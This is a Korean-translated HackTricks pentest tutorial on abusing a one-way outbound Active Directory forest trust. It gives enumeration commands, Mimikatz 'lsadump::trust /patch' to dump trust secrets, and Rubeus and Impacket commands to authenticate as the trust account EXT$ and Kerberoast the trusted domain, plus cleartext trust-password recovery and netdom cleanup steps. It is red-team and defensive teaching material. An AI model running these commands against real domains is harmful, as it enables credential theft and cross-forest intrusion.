# External Forest Domain - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

이 시나리오에서 **your domain**은 **different domain/forest**의 principal에 일부 **privileges**를 **trusting**하고 있습니다.

## Enumeration

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
AD 모듈을 사용할 수 있다면 **Trusted Domain Object (TDO)**도 직접 확인하세요. 이를 통해 나중에 쉬운 경로가 **FSP/group abuse**인지, 아니면 **trust-account abuse**인지 판단할 때 필요한 원시 LDAP 기반 trust 데이터를 확보할 수 있습니다:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
`CN=ForeignSecurityPrincipals`의 foreign principals가 실제로 어디에 access를 부여받았는지도 열거해야 합니다. 일반적으로 중요한 지점은 다음과 같습니다.

- 현재 domain의 서버/DC에 대한 **Local admin**
- users/computers/GPO에 ACL이 설정된 **custom domain group**의 멤버십
- **computer objects**를 수정할 수 있는 권한. trust configuration이 이를 허용하면 이후 [RBCD](resource-based-constrained-delegation.md)로 이어질 수 있습니다.

## Trust Account Attack

domain/forest **B**에서 domain/forest **A**로 one-way trust가 생성되면 (**B trusts A**), **B**에 대한 **trust account**가 **A**에 생성됩니다. **A**의 outbound-trust 관점에서 이는 유용합니다. 나중에 **B**(trusting side)를 compromise하면 해당 위치에서 trust secret을 dump하고 `B$`로 **A**에 다시 authenticate할 수 있기 때문입니다.<sup>[[1]](#references)</sup>

여기서 이해해야 할 핵심은 해당 trust account의 password와 Kerberos material을 다음 방법을 사용해 **trusting** domain의 Domain Controller에서 추출할 수 있다는 점입니다.<sup>[[1]](#references)</sup>
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
이는 **trusted** 도메인에 생성된 trust account가 활성화된 principal이며, 해당 도메인에서 일반 domain user의 기본 권한을 갖게 되기 때문에 가능합니다. 이는 LDAP 열거를 시작하고, tickets를 요청하며, 다음 escalation 경로를 찾기에 충분한 경우가 많습니다.<sup>[[1]](#references)</sup>

`ext.local`이 **trusting** 도메인이고 `root.local`이 **trusted** 도메인인 시나리오에서는 `EXT$`라는 user account가 `root.local` 내부에 생성됩니다. `ext.local`에서 trust keys를 덤프하면 `root.local`에 대해 `root.local\EXT$`로 사용할 수 있는 credentials가 노출됩니다:<sup>[[1]](#references)</sup>
```bash
lsadump::trust /patch
```
이 작업에 이어, 추출한 **RC4** 키를 사용해 `root.local` 내부에서 `root.local\EXT$`로 authenticate합니다:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
그런 다음 해당 principal로 trusted domain을 열거합니다. 예를 들어 `root.local`에서 high-value SPN을 Kerberoasting합니다:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Linux에서

**RC4** trust-account key를 복구했다면, Impacket를 사용해 Linux에서도 동일한 방법이 작동합니다:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
RC4가 허용되지 않으면 복구한 **cleartext password**(또는 파생된 **AES** 키)로 대체하고, 해당 foothold에서 일반적인 [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) 및 [Kerberoast](kerberoast.md) workflow를 재사용합니다.

### Key material 관련 주의사항

**trust keys**와 **trust-account credentials**를 혼동하지 마세요:<sup>[[1]](#references)</sup>

- one-way trust에서는 양쪽 모두 **TDO**를 저장하지만, 실제 **`EXT$` user account**는 trusted domain에만 존재합니다.
- 현재 trust-account password는 TDO trust secret(`NewPassword` / current trust key)에 반영됩니다.
- **RC4** trust key는 trust account로 `asktgt`에 재사용하기 가장 쉬운 artifact입니다. 기본 설정에서는 trust account에 `msDS-SupportedEncryptionTypes`가 비어 있는 경우가 많으므로 일반적으로 이것이 작동하는 enctype입니다.
- **AES trust keys**를 기준으로 생각하고 있다면, salt가 다르므로 trust-account AES keys와 서로 interchangeable하지 않다는 점을 기억하세요.

따라서 이 페이지의 technique에서는 dump된 **RC4** material 또는 복구한 **cleartext** password를 우선 사용하세요.<sup>[[1]](#references)</sup>

### Cleartext trust password 수집

이전 flow에서는 **cleartext password** 대신 trust hash를 사용했습니다. 이 password 역시 **mimikatz로 dump**됩니다.<sup>[[1]](#references)</sup>

cleartext password는 mimikatz의 \[ CLEAR ] output을 hexadecimal에서 변환하고 null byte `\x00`를 제거하여 얻을 수 있습니다:<sup>[[1]](#references)</sup>

![Trust Account Attack - Cleartext trust password 수집: mimikatz의 ( CLEAR ) output을 hexadecimal에서 변환하고 null...](<../../images/image (938).png>)

trust relationship을 생성할 때 사용자가 trust password를 직접 입력해야 하는 경우가 있습니다. 이 demonstration에서는 key가 원래 trust password이므로 사람이 읽을 수 있는 형태입니다. key가 rotate되면(기본값: 30일마다) cleartext는 일반적으로 사람이 읽을 수 없는 형태가 되지만 기술적으로는 여전히 사용할 수 있습니다.<sup>[[1]](#references)</sup>

cleartext password는 trust account로 일반 authentication을 수행하는 데 사용할 수 있으며, 이는 trust account의 Kerberos secret key로 TGT를 요청하는 방법의 대안입니다. 여기서는 `ext.local`에서 `root.local`을 query하여 `Domain Admins`의 members를 확인합니다:<sup>[[1]](#references)</sup>

![Trust Account Attack - Cleartext trust password 수집: cleartext password를 사용하면 trust account로 일반 authentication을 수행할 수 있으며, 이는 TGT를 요청하는 방법의 대안입니다...](<../../images/image (792).png>)

### Practical limitations

> [!WARNING]
> Trust account는 다루기 까다로운 principal입니다. **RUNAS / console / RDP**와 같은 interactive logon은 여기서 예상되는 경로가 아니며, **NTLM** authentication 시도는 `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`와 함께 실패할 수 있습니다. 대신 **Kerberos network logon**(`asktgt`, LDAP, CIFS, Kerberoast)을 계획하세요.<sup>[[1]](#references)</sup>

### Persistence / cleanup 참고사항

Defender가 trusting domain이 compromise되었다는 사실을 파악하면 `netdom trust ... /resetOneSide ...`를 사용하여 **양쪽 모두**에서 trust secret을 rotate해야 합니다. Operator 관점에서 이는 중요한데, **manual reset은 기존 trust material을 즉시 무효화**하는 반면 일반적인 trust-password rotation은 rollover 중에 current/previous 값을 유지하기 때문입니다.<sup>[[2]](#references)</sup>
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## 참고 문헌

- [1] [도메인 간 보안 경계로서의 SID filter? (Part 7) – Trust account attack – trusting에서 trusted로](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [2] [AD Forest Recovery – Trust password 재설정](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
